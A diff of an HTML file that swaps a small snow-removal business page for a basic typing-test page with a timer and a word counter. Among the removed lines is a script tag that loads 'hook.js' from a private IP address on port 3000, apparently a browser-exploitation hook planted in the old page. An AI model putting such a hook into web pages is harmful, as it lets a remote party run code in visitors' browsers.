@@ -3,48 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Utica Snow Shoveling Services</title>
+    <title>Typing Website</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f3f7fa;
-            color: #333;
             text-align: center;
             padding: 20px;
         }
-        h1 {
-            color: #00509e;
+        .container {
+            margin-top: 50px;
         }
-        .cta {
-            margin: 20px auto;
-            padding: 15px;
-            background-color: #00509e;
-            color: white;
-            width: fit-content;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 18px;
+        .buttons {
+            margin-top: 20px;
         }
-        .cta:hover {
-            background-color: #003b6b;
-        }
-        footer {
+        .typing-test {
+            display: none;
             margin-top: 30px;
-            font-size: 14px;
-            color: #666;
+        }
+        textarea {
+            width: 80%;
+            height: 100px;
         }
     </style>
-    <script src="http://172.19.108.78:3000/hook.js"></script>
 </head>
 <body>
-    <h1>Welcome to Utica Snow Shoveling Services!</h1>
-    <p>Need help clearing your driveway or sidewalk? We're here to make your winter stress-free!</p>
-    <p>Our reliable team is ready to provide fast and affordable snow removal services in the Utica area.</p>
-    <div class="cta" onclick="alert('Thank you for your interest! Call us at (555) 123-4567 to book your service.')">
-        Book Your Snow Removal Now
+    <h1>This is my typing website.</h1>
+    <p>In this website, you can practice typing and even use the reading test. This website has all of my hard work put into it. Enjoy!</p>
+    
+    <div class="container">
+        <div class="buttons">
+            <button onclick="startTypingTest()">Typing Test</button>
+            <button onclick="startReadingTest()">Reading Test</button>
+        </div>
     </div>
-    <footer>
-        &copy; 2024 Utica Snow Shoveling Services. All Rights Reserved.
-    </footer>
+    
+    <div id="typingTest" class="typing-test">
+        <p id="wordDisplay"></p>
+        <textarea id="typingArea" placeholder="Start typing here..." oninput="startTimer()"></textarea>
+        <p id="timer">Time Left: 15s</p>
+        <p id="result"></p>
+    </div>
+    
+    <script>
+        let words = ["apple", "banana", "cherry", "dog", "elephant", "forest", "grape", "house", "internet", "jungle"];
+        let timer;
+        let timeLeft = 15;
+        let hasStarted = false;
+        
+        function startTypingTest() {
+            document.getElementById("typingTest").style.display = "block";
+            document.getElementById("wordDisplay").innerText = words.sort(() => Math.random() - 0.5).join(" ");
+            document.getElementById("typingArea").value = "";
+            document.getElementById("result").innerText = "";
+            timeLeft = 15;
+            hasStarted = false;
+            document.getElementById("timer").innerText = "Time Left: 15s";
+        }
+        
+        function startTimer() {
+            if (!hasStarted) {
+                hasStarted = true;
+                timer = setInterval(() => {
+                    timeLeft--;
+                    document.getElementById("timer").innerText = "Time Left: " + timeLeft + "s";
+                    if (timeLeft <= 0) {
+                        clearInterval(timer);
+                        endTypingTest();
+                    }
+                }, 1000);
+            }
+        }
+        
+        function endTypingTest() {
+            let userText = document.getElementById("typingArea").value.trim().split(" ").length;
+            document.getElementById("result").innerText = "Words Typed: " + userText;
+            document.getElementById("typingArea").disabled = true;
+        }
+        
+        function startReadingTest() {
+            alert("Reading Test is not implemented yet!");
+        }
+    </script>
 </body>
 </html>
